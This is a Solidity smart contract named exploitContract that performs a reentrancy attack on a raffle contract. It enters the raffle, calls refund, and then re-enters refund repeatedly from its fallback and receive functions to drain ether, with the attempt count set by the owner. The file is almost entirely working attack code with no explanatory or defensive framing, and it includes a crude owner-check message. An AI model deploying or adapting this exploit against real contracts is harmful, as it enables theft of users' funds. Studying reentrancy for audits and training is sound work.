// first we have to create an interface, that matches the signature of the deployed contract's function
pragma solidity ^0.8.2;

contract exploitContract {

    address public owner;
    address public contractAddress;
    uint Index;
    uint attackAttempts;
    uint attackAttempted;

    constructor(address _contractAddress) {
        owner=msg.sender;
        contractAddress=_contractAddress;
    }

    function view_Time()external returns(uint) {
        (bool success, bytes memory data) =
    contractAddress.call(abi.encodeWithSignature("raffleStartTime()"));

        uint256 startTime = abi.decode(data, (uint256));

        return startTime;
    }

    function viewName() external returns(string memory){
        (bool success, ) = contractAddress.call(abi.encodeWithSignature("_baseURI()"));
    }

    function viewBalance() external view returns(uint){
        return address(this).balance;
    }

    function attack( uint amountToSend, uint gasToSendEnterRaffle, uint gasToSend, uint _attackAttempts) public payable  {
        require(msg.sender == owner, "fuck off");

        attackAttempts=_attackAttempts;

        address[1] memory player;
        player[0] = address(this);


        // VulnerableContract(contractAddress).enterRaffle{value: }(player)
        (bool success, bytes memory dataz ) = contractAddress.call{value: amountToSend, gas: gasToSendEnterRaffle}(abi.encodeWithSignature("enterRaffle(address[])", player));
        require(success, string(dataz));

        (bool success1, bytes memory data ) = contractAddress.call(abi.encodeWithSignature("getActivePlayerIndex(address)", player[0]));
        require(success1, "getActivePlayerIndexFailed");

        Index = abi.decode(data, (uint256));

        // calling the vulnerable function with high gas, so that you can call it again via the fallback function

        (bool success2, ) = contractAddress.call{gas: gasToSend}(abi.encodeWithSignature("refund(uint256)", Index));
        
    }

    fallback() external {

        attackAttempted++;
        if(attackAttempted < attackAttempts){
        
            contractAddress.call{gas: gasleft()}(abi.encodeWithSignature("refund(uint256)", Index));

        }
        
    }

    receive() external payable {
    attackAttempted++;
    if (attackAttempted < attackAttempts) {
        contractAddress.call(
            abi.encodeWithSignature("refund(uint256)", Index)
        );
    }
}
}
